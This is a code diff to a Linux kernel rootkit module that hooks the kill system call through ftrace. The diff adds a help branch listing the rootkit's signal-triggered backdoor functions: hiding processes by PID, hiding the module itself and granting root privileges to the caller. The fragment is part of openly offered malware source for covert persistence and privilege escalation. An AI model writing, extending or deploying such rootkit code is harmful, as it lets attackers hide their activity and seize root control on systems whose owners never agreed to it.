@@ -8,7 +8,6 @@
 #include <linux/kallsyms.h>
 #include <linux/tcp.h>
 #include <linux/utsname.h>
-
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
@@ -231,6 +230,17 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     {
         printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
         sprintf(hide_pid, "%d", pid);
+        return 0;
+    }
+    
+    else if (sig == 61)
+    {
+        printk(KERN_INFO "SIG                    Description\n");
+        printk(KERN_INFO "---                    -----------\n");
+        printk(KERN_INFO "61                     prints this\n");
+        printk(KERN_INFO "62                     hides a process based on the PID input of the kill command\n");
+        printk(KERN_INFO "63                     shows/hides the rootkit (hidden by default)\n");
+        printk(KERN_INFO "64                     gives root\n");
         return 0;
     }
 
